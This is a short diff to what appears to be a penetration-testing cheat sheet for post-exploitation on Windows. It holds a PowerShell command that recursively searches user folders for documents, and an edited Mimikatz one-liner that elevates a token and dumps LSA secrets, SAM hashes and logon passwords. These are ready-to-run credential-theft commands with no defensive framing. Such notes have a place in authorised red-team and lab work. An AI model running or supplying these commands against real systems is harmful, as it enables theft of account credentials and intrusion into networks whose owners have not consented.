@@ -20,7 +20,7 @@ File enumeration after PE
 get-childitem -path c:\users\ -include *.txt,*.pdf,*.doc,*.docx,*.xls,*.xlsx,*.log,*.exe -file -recurse -erroraction silentlycontinue
 
 Mimikatz non interactive
-.\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
+.\mimikatz.exe privilege::debug token::elevate lsadump::lsa lsadump::sam sekurlsa::logonpasswords exit
 lsadump::sam
 lsadump::lsa
 
